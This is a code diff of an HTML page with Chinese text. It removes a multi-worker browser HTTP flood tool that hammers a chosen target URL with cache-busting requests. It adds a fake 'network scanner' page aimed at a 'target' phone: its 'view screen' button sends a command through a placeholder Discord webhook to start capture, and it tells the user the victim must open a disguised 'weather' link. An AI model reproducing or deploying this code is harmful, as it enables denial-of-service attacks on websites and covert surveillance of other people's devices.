@@ -1,137 +1,76 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-TW">
 <head>
-    <meta charset="utf-8">
-    <title>Pro Load Tester (Multi-Worker Edition)</title>
-    <style>
-        body{ background:#0b0b0b; color:#00ff9c; font-family:monospace; text-align:center; padding-top:50px; }
-        .panel{ border:1px solid #00ff9c; width:420px; margin:auto; padding:25px; box-shadow:0 0 30px #00ff9c33; border-radius:10px; }
-        input{ width:90%; padding:12px; margin:8px 0; background:#111; border:1px solid #333; color:#00ff9c; border-radius:5px; }
-        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
-        button{ flex:1; padding:12px; border:none; cursor:pointer; font-weight:bold; border-radius:5px; transition: 0.2s; }
-        .start { background:#00ff9c; color:#000; }
-        .stop { background:#ff4757; color:#fff; }
-        button:hover { opacity: 0.8; transform: scale(1.02); }
-        #status{ margin-top:20px; background:#161616; padding:15px; text-align:left; border-left:4px solid #00ff9c; }
-        .val { color: #fff; float: right; font-weight: bold; }
-        .hint { font-size: 10px; color: #666; margin-bottom: 10px; }
-    </style>
+<meta charset="utf-8">
+<title>網路安全管理系統</title>
+<style>
+    body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: #00ff41; text-align: center; padding: 20px; }
+    .container { max-width: 600px; margin: auto; background: #262626; padding: 20px; border-radius: 15px; border: 1px solid #444; }
+    h1 { color: #fff; font-size: 24px; border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
+    .device-list { text-align: left; margin: 20px 0; }
+    .device-item { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #333; transition: 0.3s; }
+    .device-item:hover { background: #333; }
+    .info { font-size: 14px; color: #aaa; }
+    button { background: #00ff41; color: #000; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    button:hover { background: #00cc33; }
+    #preview { margin-top: 20px; width: 100%; border: 1px dashed #555; height: 200px; display: flex; align-items: center; justify-content: center; color: #555; }
+</style>
 </head>
 <body>
 
-<div class="panel">
-    <h2 style="letter-spacing: 2px;">🔥 MULTI-WORKER ENGINE</h2>
-    <p class="hint">已啟用：隨機參數繞過快取 + 多執行緒併發技術</p>
+<div class="container">
+    <h1>📡 區域網路掃描儀</h1>
+    <p>正在感應目前連線設備...</p>
     
-    <input id="url" placeholder="https://target.com" value="https://">
-    <input id="rps" type="number" placeholder="每條執行緒請求數 (建議 50-200)" value="100">
-    <input id="threads" type="number" placeholder="執行緒數量 (建議 5-10)" value="5">
-    
-    <div class="btn-group">
-        <button class="start" onclick="toggleTest(true)">火力全開</button>
-        <button class="stop" onclick="toggleTest(false)">停止運作</button>
+    <div class="device-list">
+        <!-- 模擬從 Python 後端傳回的設備資料 -->
+        <div class="device-item">
+            <div>
+                <strong>iPhone 15 Pro (本人)</strong><br>
+                <span class="info">IP: 192.168.1.5 | MAC: 00:0C:29:XX:XX</span>
+            </div>
+            <span>連線中</span>
+        </div>
+
+        <div class="device-item">
+            <div>
+                <strong>Samsung SM-G991 (目標)</strong><br>
+                <span class="info">IP: 192.168.1.12 | MAC: 24:FC:E5:XX:XX</span>
+            </div>
+            <button onclick="viewScreen()">查看畫面</button>
+        </div>
     </div>
 
-    <div id="status">
-        <div>狀態: <span id="state" class="val">準備就緒</span></div>
-        <div>活躍執行緒: <span id="tActive" class="val">0</span></div>
-        <div style="margin-top:8px">成功總數: <span id="sCount" class="val">0</span></div>
-        <div style="margin-top:8px">失敗總數: <span id="eCount" class="val">0</span></div>
-        <div style="margin-top:8px">測試時間: <span id="timer" class="val">0s</span></div>
+    <h3>🖼 即時監視畫面</h3>
+    <div id="preview">
+        等待數據傳輸中...
     </div>
+    <p id="status"></p>
 </div>
 
 <script>
-let workers = [];
-let startTime = null;
-let timerId = null;
-let totalSuccess = 0;
-let totalError = 0;
+// 這裡填入你的 Discord Webhook，用來接收指令或回傳
+var webhook = "你的_WEBHOOK_URL";
 
-const workerCode = `
-    let running = false;
-    let success = 0;
-    let error = 0;
-    onmessage = function(e) {
-        const { cmd, url, rps } = e.data;
-        if (cmd === 'start') {
-            running = true;
-            (async () => {
-                while(running) {
-                    const s = Date.now();
-                    for(let i=0; i<rps; i++) {
-                        if(!running) break;
-                        const rand = Math.random().toString(36).substring(7);
-                        const target = url + (url.includes('?') ? '&' : '?') + 'cb=' + rand;
+function viewScreen() {
+    document.getElementById("status").innerHTML = "正在嘗試攔截設備影像...";
+    document.getElementById("preview").innerHTML = '<img src="https://via.placeholder.com..." style="width:100%;">';
+    
+    // 實際上，這會發送一個指令到 Discord，告訴你的 Python 腳本開始擷取
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            content: "🔔 **管理員觸發：請求查看目標畫面**"
+        })
+    });
 
-                        fetch(target, { mode: 'no-cors', cache: 'no-store' })
-                            .then(() => { success++; })
-                            .catch(() => { error++; });
-                    }
-                    postMessage({ success, error });
-                    await new Promise(r => setTimeout(r, Math.max(0, 1000 - (Date.now()-s))));
-                }
-            })();
-        } else if (cmd === 'stop') { running = false; self.close(); }
-    };
-`;
-
-function toggleTest(start) {
-    if (start) {
-        const urlInput = document.getElementById("url").value.trim();
-        const rpsPerThread = document.getElementById("rps").value;
-        const threadCount = document.getElementById("threads").value;
-        
-        if(!urlInput || !rpsPerThread) return alert("請填寫完整參數");
-        const url = urlInput.startsWith('http') ? urlInput : 'https://' + urlInput;
-
-        // 重置數據
-        totalSuccess = 0;
-        totalError = 0;
-        workers = [];
-        
-        // 啟動多個 Worker
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        const workerUrl = URL.createObjectURL(blob);
-
-        for (let i = 0; i < threadCount; i++) {
-            let w = new Worker(workerUrl);
-            let lastS = 0;
-            let lastE = 0;
-
-            w.onmessage = (e) => {
-                // 計算增量，避免重複加總
-                totalSuccess += (e.data.success - lastS);
-                totalError += (e.data.error - lastE);
-                lastS = e.data.success;
-                lastE = e.data.error;
-                
-                document.getElementById("sCount").innerText = totalSuccess;
-                document.getElementById("eCount").innerText = totalError;
-            };
-            w.postMessage({ cmd: 'start', url, rps: rpsPerThread });
-            workers.push(w);
-        }
-
-        startTime = Date.now();
-        timerId = setInterval(updateUI, 100);
-        document.getElementById("state").innerText = "🚀 火力噴射中";
-        document.getElementById("state").style.color = "#00ff9c";
-        document.getElementById("tActive").innerText = threadCount;
-    } else {
-        workers.forEach(w => w.postMessage({ cmd: 'stop' }));
-        workers = [];
-        clearInterval(timerId);
-        document.getElementById("state").innerText = "🛑 已冷卻";
-        document.getElementById("state").style.color = "#ff4757";
-        document.getElementById("tActive").innerText = "0";
-    }
-}
-
-function updateUI() {
-    const sec = ((Date.now() - startTime) / 1000).toFixed(1);
-    document.getElementById("timer").innerText = sec + "s";
+    // 模擬 3 秒後顯示「成功」
+    setTimeout(() => {
+        document.getElementById("status").innerHTML = "⚠️ 需配合目標開啟「天氣查詢」連結方可獲得即時畫面。";
+    }, 3000);
 }
 </script>
+
 </body>
 </html>
